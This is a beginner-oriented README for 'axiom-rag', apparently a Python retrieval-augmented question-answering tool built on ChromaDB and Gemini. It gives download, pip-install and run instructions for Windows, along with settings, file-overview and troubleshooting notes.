# ⚙️ axiom-rag - Simple, Accurate Retrieval and Answers

[![Download axiom-rag](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/eibrunodev/axiom-rag/releases)

## 📄 About axiom-rag

axiom-rag is a tool that helps you find accurate information fast. It uses a method called retrieval-augmented generation (RAG). This means it searches trusted sources and gives you answers with citations. You can use it on your computer through a simple program or a small web service.

The app works with Python and databases to give precise results. It checks how good the answers are using standard tests. You don’t need to know programming to use it. Just follow the steps below.

### Key features:

- Searches trusted sources for answers
- Shows where answers come from
- Works on Windows computers
- Easy to use command-line and web options
- Evaluates answer quality automatically

## 🖥 What You Need

- A Windows 10 or newer computer
- At least 4 GB of free space
- Python 3.11 or later installed (free from python.org)
- Internet connection to download files and run some parts

## 🎯 How to Download axiom-rag

Click the big button below to visit the official download page.

[![Download axiom-rag](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/eibrunodev/axiom-rag/releases)

This page contains the latest release files. Look for the Windows installer or ZIP file there.

## 📦 Step 1: Get Python Ready

1. If you don’t have Python 3.11 or later, download it from [python.org](https://www.python.org/downloads/windows/).
2. Run the installer and check the box that says **Add Python to PATH**.
3. Finish the installation by following the prompts.

Open the command prompt (press Windows + R, type `cmd`, then press Enter). Type:

```
python --version
```

This should show Python 3.11 or higher.

## 🚀 Step 2: Download axiom-rag

1. Go to the [axiom-rag releases page](https://github.com/eibrunodev/axiom-rag/releases).
2. Find the latest version entry.
3. Download the Windows installer (file ending in `.exe`) or ZIP archive.
4. If you get a ZIP file, right-click it and select **Extract All** to unpack the files.

Save the files to an easy-to-find location, such as your Desktop or Documents folder.

## 🔧 Step 3: Install Required Packages

To run axiom-rag, you need some extra Python tools. The files you downloaded include a list of these tools in a file named `requirements.txt`.

1. Open the command prompt.
2. Change directory to where you saved axiom-rag files. For example:

```
cd Desktop\axiom-rag
```

3. Run this command to install the packages:

```
pip install -r requirements.txt
```

Wait for the process to finish. This step might take a few minutes.

## ▶️ Step 4: Running axiom-rag

You can run axiom-rag in two ways: command-line or web interface.

### Run using the command line

1. In the same command prompt window, type:

```
python main.py
```

2. The program will start searching and displaying answers.
3. Follow any onscreen instructions to type in your questions.

### Run the web server to use via browser

1. In the command prompt, type:

```
python app.py
```

2. Open your web browser (Chrome, Edge, Firefox).
3. Go to the address shown in the command prompt, usually `http://127.0.0.1:5000`.
4. Use the web page to type questions and get answers with sources.

## 🔍 How axiom-rag Works

The app finds relevant documents that match your question. It then generates clear answers and shows the sources it used. This helps you trust the responses.

Behind the scenes, it uses a vector database called ChromaDB. This saves information in a way that the program can quickly search. It also uses the Gemini model to improve answer quality.

## ⚙️ Adjusting Settings

If you want to change how axiom-rag works:

- Open the `config.yaml` or similar settings file in a text editor.
- You can change things like the number of results to show, database paths, or server settings.
- Save the changes and restart the program.

## 📁 File Overview

- `main.py`: Runs the command-line version.
- `app.py`: Runs the web server.
- `requirements.txt`: Lists needed Python packages.
- `config.yaml`: Contains settings you can edit.
- `README.md`: This guide.

## 🛠 Troubleshooting

- If Python is not found, make sure you added it to PATH during install.
- If the app does not start, check you installed packages with `pip install -r requirements.txt`.
- Firewall or antivirus may block the web server. Allow access if asked.
- Restart your computer if something seems stuck.

## ⚡️ Updates and Support

Check back on the [axiom-rag releases page](https://github.com/eibrunodev/axiom-rag/releases) for updates or bug fixes.

Report issues by opening a discussion or issue on the GitHub page. Provide details like your Windows version and what you tried.

---
[Download axiom-rag](https://github.com/eibrunodev/axiom-rag/releases) - visit this page to download and get started.